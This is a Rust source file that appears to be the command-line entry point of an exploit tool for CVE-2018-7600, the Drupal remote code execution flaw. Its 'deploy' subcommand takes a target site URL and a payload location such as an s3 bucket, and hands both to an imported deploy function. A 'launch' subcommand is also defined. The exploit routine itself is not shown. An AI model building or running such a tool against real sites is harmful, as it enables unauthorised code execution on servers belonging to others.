extern crate clap;
extern crate tokio;

use clap::{App, Arg, SubCommand};
use payload::{deploy, launch};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let app = create_app();
    let args = app.get_matches();

    if args.is_present("launch") {
        return launch();
    }

    if let Some(deploy_args) = args.subcommand_matches("deploy") {
        let resp = deploy(
            deploy_args
                .value_of("target")
                .expect("A target must be specified"),
            deploy_args
                .value_of("payload")
                .expect("The payload must be specified"),
        )
        .await?;
        println!("{}", resp);
    }

    Ok(())
}

fn create_app<'a, 'b>() -> App<'a, 'b> {
    App::new("Payload")
        .version("0.1.0")
        .about("https://nvd.nist.gov/vuln/detail/CVE-2018-7600")
        .subcommand(
            SubCommand::with_name("deploy")
                .arg(Arg::with_name("target").help("The targets location eg http://localhost/"))
                .arg(
                    Arg::with_name("payload").help("Payload location eg s3://your-bucket/payload"),
                ),
        )
        .subcommand(SubCommand::with_name("launch"))
}
